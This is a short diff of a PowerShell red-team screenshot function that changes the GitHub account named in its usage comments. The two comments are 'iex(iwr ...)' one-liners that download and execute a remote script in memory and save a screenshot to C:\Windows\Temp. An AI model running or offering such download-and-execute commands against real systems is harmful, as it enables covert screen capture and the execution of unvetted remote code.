@@ -1,7 +1,7 @@
 function Take-Screenshot {
-	# iex(iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_2.ps1);Take-Screenshot -Path C:\Windows\Temp\1.png
+	# iex(iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Easy_2.ps1);Take-Screenshot -Path C:\Windows\Temp\1.png
 	# OR
-	# powershell.exe "iex(iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_2.ps1);Take-Screenshot -Path C:\Windows\Temp\Take_ScreenShot_Easy_2.png
+	# powershell.exe "iex(iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Easy_2.ps1);Take-Screenshot -Path C:\Windows\Temp\Take_ScreenShot_Easy_2.png
 	# Output file is a png
 	
 	param(
